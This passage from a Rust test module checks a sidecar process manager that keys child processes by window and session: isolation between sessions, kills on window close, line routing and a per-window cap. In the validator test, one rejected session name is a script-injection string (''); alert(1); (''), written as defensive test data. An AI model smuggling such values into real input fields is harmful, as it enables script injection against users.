        (filho, stdin)
    }

    fn vivo(sc: &Sidecars, chave: &str) -> bool {
        let mut m = sc.map.lock().unwrap();
        match m.get_mut(chave).and_then(|o| o.as_mut()) {
            Some(s) => matches!(s.child.try_wait(), Ok(None)),
            None => false,
        }
    }

    #[test]
    fn a_chave_sem_sessao_e_a_de_antes() {
        // A page that never names a session must land on the exact key 1.7.1 used.
        assert_eq!(chave("main", ""), "main");
        assert_ne!(chave("main", "p1"), "main");
        assert!(da_janela(&chave("main", ""), "main"));
        assert!(da_janela(&chave("main", "p1"), "main"));
        // Another window whose label starts the same is another window.
        assert!(!da_janela(&chave("main2", ""), "main"));
        assert!(!da_janela(&chave("main2", "p1"), "main"));
    }

    #[test]
    fn nome_de_sessao_e_entrada_nao_confiavel() {
        for ok in ["", "p42", "proj-7", "a1b2c3d4-e5f6-4789-abcd-0123456789ab", "p:1.2_x"] {
            assert!(sessao_valida(ok), "{ok:?} should be accepted");
        }
        let longo = "x".repeat(65);
        for ruim in ["a b", "a\u{1f}b", "'); alert(1); ('", "p/1", "p\n1", longo.as_str()] {
            assert!(!sessao_valida(ruim), "{ruim:?} should be refused");
        }
    }

    /// 🔴 The bug 1.8.0 exists for: a new session in the window used to kill the one that was
    /// working. Two projects, two sessions, both alive.
    #[test]
    fn duas_sessoes_da_mesma_janela_convivem() {
        let sc = Sidecars::default();
        let (f1, s1) = processo("sleep 30");
        let (f2, s2) = processo("sleep 30");
        let g1 = sc.insert(chave("janela", "p1"), f1, s1);
        sc.insert(chave("janela", "p2"), f2, s2);
        assert!(vivo(&sc, &chave("janela", "p1")), "starting p2 killed p1");
        assert!(vivo(&sc, &chave("janela", "p2")));
        assert_eq!(sc.sessoes_da_janela("janela"), 2);
        // p1's generation is still the live one under ITS key: its stdout thread must be able
        // to report its end, which the old window-wide generation would have swallowed.
        assert!(sc.existe(&chave("janela", "p1")));
        sc.kill_one("janela");
        let _ = g1;
    }

    #[test]
    fn parar_uma_sessao_nao_toca_na_outra() {
        let sc = Sidecars::default();
        let (f1, s1) = processo("sleep 30");
        let pid1 = f1.id();
        let (f2, s2) = processo("sleep 30");
        sc.insert(chave("janela", "p1"), f1, s1);
        sc.insert(chave("janela", "p2"), f2, s2);

        sc.kill_sessao(&chave("janela", "p1"));

        assert!(!sc.existe(&chave("janela", "p1")));
        assert!(vivo(&sc, &chave("janela", "p2")), "stopping p1 reached p2");
        // p1 really ends: `sleep` ignores the exit request, so the deadline kills it.
        #[cfg(target_os = "linux")]
        {
            let t = std::time::Instant::now();
            while std::path::Path::new(&format!("/proc/{pid1}")).exists() && t.elapsed() < std::time::Duration::from_secs(5) {
                std::thread::sleep(std::time::Duration::from_millis(50));
            }
            assert!(!std::path::Path::new(&format!("/proc/{pid1}")).exists(), "p1 still running after its kill");
        }
        let _ = pid1;
        sc.kill_one("janela");
    }

    #[test]
    fn a_linha_vai_so_para_a_sessao_nomeada() {
        let dir = std::env::temp_dir().join(format!("shvia-sessoes-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let (a, b) = (dir.join("p1"), dir.join("p2"));
        let sc = Sidecars::default();
        let script = |f: &std::path::Path| format!("read l; echo \"$l\" > '{}'", f.display());
        let (f1, s1) = processo(&script(&a));
        let (f2, s2) = processo(&script(&b));
        let g1 = sc.insert(chave("janela", "p1"), f1, s1);
        let g2 = sc.insert(chave("janela", "p2"), f2, s2);

        assert!(sc.send_line(&chave("janela", "p2"), "para-p2"));
        assert!(sc.send_line(&chave("janela", "p1"), "para-p1"));
        // Both read one line and leave: reaping them is the wait for the writes.
        assert_eq!(sc.colher(&chave("janela", "p2"), g2), Some(Some(0)));
        assert_eq!(sc.colher(&chave("janela", "p1"), g1), Some(Some(0)));
        assert_eq!(std::fs::read_to_string(&a).unwrap().trim(), "para-p1");
        assert_eq!(std::fs::read_to_string(&b).unwrap().trim(), "para-p2");
        // A session that does not exist receives nothing, and says so.
        assert!(!sc.send_line(&chave("janela", "p3"), "ninguem"));
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// Reload and window close still end everything the window started — and nothing else.
    #[test]
    fn fechar_a_janela_encerra_todas_as_dela_e_so_as_dela() {
        let sc = Sidecars::default();
        for (janela, sessao) in [("janela", ""), ("janela", "p1"), ("janela", "p2"), ("outra", "p1")] {
            let (f, s) = processo("sleep 30");
            sc.insert(chave(janela, sessao), f, s);
        }
        assert!(sc.tem_sessao("janela"));
        sc.kill_one("janela");
        assert_eq!(sc.sessoes_da_janela("janela"), 0);
        assert!(!sc.tem_sessao("janela"));
        assert!(vivo(&sc, &chave("outra", "p1")), "closing one window reached another");
        sc.kill_one("outra");
    }

    #[test]
    fn so_uma_sessao_nova_conta_para_o_teto() {
        let sc = Sidecars::default();
        for i in 0..MAX_SESSOES_POR_JANELA {
            assert!(sc.cabe("janela", &chave("janela", &format!("p{i}"))), "session {i} refused below the cap");
            let (f, s) = processo("sleep 30");
            sc.insert(chave("janela", &format!("p{i}")), f, s);
        }
        assert!(!sc.cabe("janela", &chave("janela", "mais-uma")), "the cap let one more in");
        // A respawn of an existing session replaces it, so it always fits.
        assert!(sc.cabe("janela", &chave("janela", "p0")));
        // The cap is per window.
        assert!(sc.cabe("outra", &chave("outra", "p0")));
        sc.kill_one("janela");
    }
}
